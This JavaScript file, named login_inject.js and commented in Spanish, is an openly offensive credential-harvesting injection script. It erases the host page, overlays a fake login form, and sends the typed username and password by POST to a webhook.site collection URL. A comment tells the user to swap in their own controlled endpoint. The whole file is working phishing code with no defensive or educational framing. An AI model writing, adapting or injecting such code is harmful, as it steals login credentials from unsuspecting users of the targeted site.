// login_inject.js
(function () {
  // Limpia todo
  document.documentElement.innerHTML =
    "<head>" + document.head.innerHTML + "</head><body></body>";

  const wrap = document.createElement("div");
  wrap.style = `
    position:fixed; inset:0;
    display:flex; align-items:center; justify-content:center;
    background:#0f172a; font-family:system-ui; color:#e6eef8;
  `;

  wrap.innerHTML = `
    <div style="background:rgba(255,255,255,0.06);padding:26px;border-radius:14px;width:300px;">
      <h2 style="margin:0 0 14px;font-size:20px;">Login</h2>
      <form id="lf">
        <input name="user" placeholder="Usuario" required
          style="width:100%;padding:10px;margin-bottom:10px;border-radius:8px;border:0;">
        <input name="pass" placeholder="Contraseña" type="password" required
          style="width:100%;padding:10px;margin-bottom:10px;border-radius:8px;border:0;">
        <button style="width:100%;padding:10px;border-radius:8px;border:0;cursor:pointer;">
          Entrar
        </button>
      </form>
    </div>
  `;
  document.body.appendChild(wrap);

  document.getElementById("lf").addEventListener("submit", async (e) => {
    e.preventDefault();

    const data = {
      user: e.target.user.value,
      pass: e.target.pass.value
    };

    // <<< CAMBIA ESTA URL CUANDO TENGAS TU ENDPOINT CONTROLADO >>>
    const TARGET = "https://webhook.site/0fd6a730-34ad-4597-951e-4cecb8aeb596/login";

    const r = await fetch(TARGET, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    console.log("Respuesta:", r.status);
    alert("POST enviado al endpoint local. Revisa consola.");
  });
})();
